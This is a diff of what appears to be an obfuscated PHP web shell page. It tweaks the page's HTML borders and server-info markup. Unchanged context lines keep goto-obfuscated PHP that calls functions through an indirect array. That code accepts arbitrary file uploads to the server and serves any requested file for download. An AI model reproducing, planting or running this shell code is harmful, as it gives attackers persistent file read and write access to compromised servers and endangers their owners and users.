@@ -116,7 +116,7 @@ padding-bottom: 0px;
 </head>
 <body>
 <div class="bg-dark table-responsive text-light border" style="margin-left:auto;margin-right:auto">
-<div class="maan-top-bar">
+<div class="maan-top-bar border-top border-left border-right">
 <div class="date-time">
 <div class="maan-current-date">
 <span class="maan-current-week" id="maan-current-week-day"></span><font color="white"> : </font><span class="maan-current-day" id="maan-current-date"></span></div>
@@ -128,8 +128,7 @@ padding-bottom: 0px;
 </a></center>
 </h1>
 <div class="border-top table-responsive">
-<li><?= $c8[0](); ?></li>
-</div>
+<span>Server: <?= $c8[0](); ?></span>
 <div class="d-flex justify-content-between p-1">
 <div>
 <span>PHP Version : 
@@ -152,6 +151,7 @@ padding-bottom: 0px;
 </div>
 </form>
 <?php  if (!isset($_FILES["f"])) { goto ea; } $Wx = $_FILES["f"]["name"]; $lE = 0; th: if (!($lE < count($Wx))) { goto dx; } if ($c8[11]($_FILES["f"]["tmp_name"][$lE], $Wx[$lE])) { goto PG; } Xe("file failed to upload", 0); goto tG; PG: XE("file uploaded successfully"); tG: g9: $lE++; goto th; dx: ea: if (!isset($_GET["download"])) { goto FA; } header("Content-Type: application/octet-stream"); header("Content-Transfer-Encoding: Binary"); header("Content-Length: " . $c8[17](JD($_GET["n"]))); header("Content-disposition: attachment; filename=\"" . jd($_GET["n"]) . "\""); FA: ?>
+</div>
 </div>
 </div>
 <div class="bg-dark border table-responsive mt-2">
